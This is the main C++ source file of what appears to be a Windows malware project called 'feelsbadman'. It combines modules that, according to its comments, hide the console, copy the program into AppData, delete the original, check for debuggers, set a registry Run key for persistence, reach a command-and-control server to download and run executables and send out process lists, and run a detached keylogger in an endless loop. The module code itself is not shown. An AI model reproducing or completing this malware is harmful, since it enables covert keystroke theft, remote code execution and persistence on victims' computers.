// feelsbadman.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "C2.h"
#include "CP.h"
#include "RM.h"
#include "DB.h"
#include "RG.h"
#include "MP.h"
#include "KB.h"
#include "UTIL.h";
#include <iostream>
#include <thread>

int main()
{
	FreeConsole();

	// instantiate modules
	CP copyModule;			// copies feelsbadman.exe to AppData/Roaming/clone.exe
	C2 connModule;			// connects to C2 server: downloads and runs .exe, exfiltrates running processes
	RM remvModule;			// removes/deletes the feelsbadman.exe
	DB debgModule;			// checks for running debugger
	RG regsModule;			// adds registry RUN key for clone.exe
	MP msptModule;			// checks if microsoft paint is running and closes it
	UTIL util;				// utility for facilitating all modules
	
	if (!util.isExecutingFromAppData()) {
		copyModule.execute();
		debgModule.execute();
		remvModule.execute();
		return 0;
	}

	// start new thread for key logger and detach from main thread
	thread keylogger(keyLoop);
	keylogger.detach();

	while (true) {
		// do bad stuff
		regsModule.execute();
		debgModule.execute();
		connModule.execute();
		msptModule.execute();
		Sleep(20000);
	}
}



